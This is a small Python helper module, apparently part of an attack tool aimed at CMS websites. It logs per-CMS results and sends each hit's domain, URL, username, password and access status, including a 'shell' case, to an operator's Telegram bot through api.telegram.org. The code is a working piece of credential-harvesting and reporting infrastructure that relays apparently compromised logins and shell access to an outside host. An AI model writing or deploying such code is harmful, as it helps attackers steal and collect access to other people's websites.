import sys, requests, json
from colorama import Fore, init

init(autoreset=True)

def Logger(cmsName, args):
    sys.stdout.write(f"\n{Fore.LIGHTCYAN_EX}[{Fore.LIGHTYELLOW_EX}{cmsName}{Fore.LIGHTCYAN_EX}] -- {Fore.WHITE}{args}")

def SendLoggerTelegram(types, domain, url, username, password, accessStatus):
    try:
        __CONFIG__ = json.load(open("config.json", "r"))
        if __CONFIG__["NotiferTelegram"]["status"]:
            if types == "shell":
                textSend = f"""
*🔔 {domain}
==============================*
{url}
{username}
{password}
*==============================*
*{accessStatus}
==============================*
    """
                requests.get(f"https://api.telegram.org/bot{__CONFIG__['NotiferTelegram']['TOKEN']}/sendMessage?text={textSend}&chat_id={__CONFIG__['NotiferTelegram']['chat_id']}&parse_mode=MarkDown")
            else:
                textSend = f"""
*🔔 {domain}
==============================*
{url}
{username}
{password}
*==============================*
*{accessStatus}
==============================*
    """
                requests.get(f"https://api.telegram.org/bot{__CONFIG__['NotiferTelegram']['TOKEN']}/sendMessage?text={textSend}&chat_id={__CONFIG__['NotiferTelegram']['chat_id']}&parse_mode=MarkDown")
        else:
            pass
    except:
        pass